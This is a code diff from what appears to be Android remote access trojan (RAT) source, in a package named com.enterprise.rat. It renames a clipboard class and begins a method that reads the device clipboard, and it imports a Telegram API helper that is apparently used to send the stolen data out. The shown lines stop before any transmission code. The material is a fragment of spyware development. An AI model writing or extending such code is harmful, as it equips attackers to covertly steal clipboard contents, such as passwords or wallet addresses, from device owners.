@@ -5,7 +5,7 @@ import android.content.ClipboardManager;
 import android.content.Context;
 import com.enterprise.rat.utils.TelegramApi;
 
-public class ClipboardManager {
+public class ClipboardHelper {
     public static void getClipboard(Context context) {
         ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
         if (cm.hasPrimaryClip()) {
